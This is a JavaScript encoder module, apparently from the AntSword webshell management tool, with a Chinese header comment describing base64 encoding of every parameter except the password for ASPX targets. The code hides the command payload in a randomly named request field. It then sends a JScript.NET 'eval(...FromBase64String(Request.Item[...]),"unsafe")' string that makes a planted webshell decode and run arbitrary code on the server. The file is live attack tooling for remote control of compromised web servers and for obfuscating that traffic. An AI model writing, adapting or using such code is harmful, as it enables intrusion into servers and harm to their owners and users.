//
// aspx::base64 编码模块
//
// :把除了密码的其他参数都base64编码一次
//

'use strict';

module.exports = (pwd, data, ext = null) => {
  let randomID;
  if (ext.opts.otherConf['use-random-variable'] === 1) {
    randomID = antSword.utils.RandomChoice(antSword['RANDOMWORDS']);
  } else {
    randomID = `${antSword['utils'].RandomLowercase()}${Math.random().toString(16).substr(2)}`;
  }
  data[randomID] = Buffer
    .from(data['_'])
    .toString('base64');
  data[pwd] = `eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(Request.Item["${randomID}"])),"unsafe");`;
  delete data['_'];
  return data;
}